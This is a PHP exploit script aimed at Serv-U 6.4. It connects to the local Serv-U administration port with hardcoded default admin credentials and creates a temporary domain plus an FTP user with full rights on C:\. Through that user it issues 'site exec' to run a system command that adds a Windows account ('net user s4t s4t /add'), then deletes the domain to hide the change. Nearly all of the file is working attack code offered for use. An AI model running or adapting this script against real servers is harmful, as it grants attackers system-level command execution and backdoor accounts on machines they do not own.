<?php

/*************************************

Serv-U 6.4

*************************************/


$localaddr = '0.0.0.0';
$ftpport = 21;
$suport = 43958;
$suuser = 'LocalAdministrator';
$supass = '#l@$ak#.lk;0@P';
$username = 's4t';
$password = 's4t';
$homedir = 'c:\\';

/***********
adduser ��ʾ��SERV-U�ｨ��һ��������ȫȨ�޵��ʻ�
command ��ʾֱ��ִ������
***********/
$job = 'command';
$sucommand = 'net user s4t s4t /add';


// ����ִ�в���

$sendbuf = "";
$recvbuf = "";
$domain = "-SETDOMAIN\r\n".
	"-Domain=haxorcitos|".$localaddr."|".$ftpport."|-1|1|0\r\n".
	"-TZOEnable=0\r\n".
	" TZOKey=\r\n";
$adduser = "-SETUSERSETUP\r\n".
	"-IP=".$localaddr."\r\n".
	"-PortNo=".$ftpport."\r\n".
	"-User=".$username."\r\n".
	"-Password=".$password."\r\n".
	"-HomeDir=c:\\\r\n".
	"-LoginMesFile=\r\n".
	"-Disable=0\r\n".
	"-RelPaths=1\r\n".
	"-NeedSecure=0\r\n".
	"-HideHidden=0\r\n".
	"-AlwaysAllowLogin=0\r\n".
	"-ChangePassword=0\r\n".
	"-QuotaEnable=0\r\n".
	"-MaxUsersLoginPerIP=-1\r\n".
	"-SpeedLimitUp=0\r\n".
	"-SpeedLimitDown=0\r\n".
	"-MaxNrUsers=-1\r\n".
	"-IdleTimeOut=600\r\n".
	"-SessionTimeOut=-1\r\n".
	"-Expire=0\r\n".
	"-RatioUp=1\r\n".
	"-RatioDown=1\r\n".
	"-RatiosCredit=0\r\n".
	"-QuotaCurrent=0\r\n".
	"-QuotaMaximum=0\r\n".
	"-Maintenance=None\r\n".
	"-PasswordType=Regular\r\n".
	"-Ratios=None\r\n".
	" Access=".$homedir."\|RWAMELCDP\r\n";
$deldomain="-DELETEDOMAIN\r\n".
	"-IP=".$localaddr."\r\n".
	" PortNo=".$ftpport."\r\n";

$sock = fsockopen("127.0.0.1", $suport, &$errno, &$errstr, 10);
$recvbuf = fgets($sock, 1024);
echo "<font color=red>Recv: $recvbuf</font><br />";
$sendbuf = "USER ".$suuser."\r\n";
fputs($sock, $sendbuf, strlen($sendbuf));
echo "<font color=blue>Send: $sendbuf</font><br />";
$recvbuf = fgets($sock, 1024);
echo "<font color=red>Recv: $recvbuf</font><br />";
$sendbuf = "PASS ".$supass."\r\n";
fputs($sock, $sendbuf, strlen($sendbuf));
echo "<font color=blue>Send: $sendbuf</font><br />";
$recvbuf = fgets($sock, 1024);
echo "<font color=red>Recv: $recvbuf</font><br />";
$sendbuf = "SITE MAINTENANCE\r\n";
fputs($sock, $sendbuf, strlen($sendbuf));
echo "<font color=blue>Send: $sendbuf</font><br />";
$recvbuf = fgets($sock, 1024);
echo "<font color=red>Recv: $recvbuf</font><br />";
$sendbuf = $domain;
fputs($sock, $sendbuf, strlen($sendbuf));
echo "<font color=blue>Send: $sendbuf</font><br />";
$recvbuf = fgets($sock, 1024);
echo "<font color=red>Recv: $recvbuf</font><br />";
$sendbuf = $adduser;
fputs($sock, $sendbuf, strlen($sendbuf));
echo "<font color=blue>Send: $sendbuf</font><br />";
$recvbuf = fgets($sock, 1024);
echo "<font color=red>Recv: $recvbuf</font><br />";
echo "**********************************************************<br />";
if($job!='adduser'){
	echo "Starting Exploit ...<br />";
	echo "**********************************************************<br />";
	$exp = fsockopen("127.0.0.1", $ftpport, &$errno, &$errstr, 10);
	$recvbuf = fgets($exp, 1024);
	echo "<font color=red>Recv: $recvbuf</font><br />";
	$sendbuf = "USER ".$username."\r\n";
	fputs($exp, $sendbuf, strlen($sendbuf));
	echo "<font color=blue>Send: $sendbuf</font><br />";
	$recvbuf = fgets($exp, 1024);
	echo "<font color=red>Recv: $recvbuf</font><br />";
	$sendbuf = "PASS ".$password."\r\n";
	fputs($exp, $sendbuf, strlen($sendbuf));
	echo "<font color=blue>Send: $sendbuf</font><br />";
	$recvbuf = fgets($exp, 1024);
	echo "<font color=red>Recv: $recvbuf</font><br />";
	$sendbuf = "site exec ".$sucommand."\r\n";
	fputs($exp, $sendbuf, strlen($sendbuf));
	echo "<font color=blue>Send: site exec</font> <font color=green>".$sucommand."</font><br />";
	$recvbuf = fgets($exp, 1024);
	echo "<font color=red>Recv: $recvbuf</font><br />";
	echo "**********************************************************<br />";
	echo "Starting Delete Domain ...<br />";
	echo "**********************************************************<br />";
	$sendbuf = $deldomain;
	fputs($sock, $sendbuf, strlen($sendbuf));
	echo "<font color=blue>Send: $sendbuf</font><br />";
	$recvbuf = fgets($sock, 1024);
	echo "<font color=red>Recv: $recvbuf</font><br />";
}else{
	echo "All done ...<br />";
	echo "**********************************************************<br />";
}
fclose($sock);
if($job!='adduser') fclose($exp);

?>